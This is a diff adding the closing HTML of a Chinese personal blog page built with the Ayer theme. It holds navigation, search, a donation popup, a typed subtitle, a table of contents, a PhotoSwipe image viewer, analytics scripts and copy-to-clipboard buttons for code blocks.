+      <a class="nav-item-link" href="/2019/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search" title="Suche">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+      strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
+      startDelay: 0,
+      typeSpeed: 200,
+      loop: true,
+      backSpeed: 100,
+      showCursor: true
+    });
+  } catch (err) {
+  }
+
+</script>
+
+
+
+<script src="/js/tocbot.min.js"></script>
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+<script src="/dist/main.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+
+
+<!-- 复制 -->
+
+  <link rel="stylesheet" href="/css/clipboard.css">
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+    
+  </div>
+</body>
+
+</html>
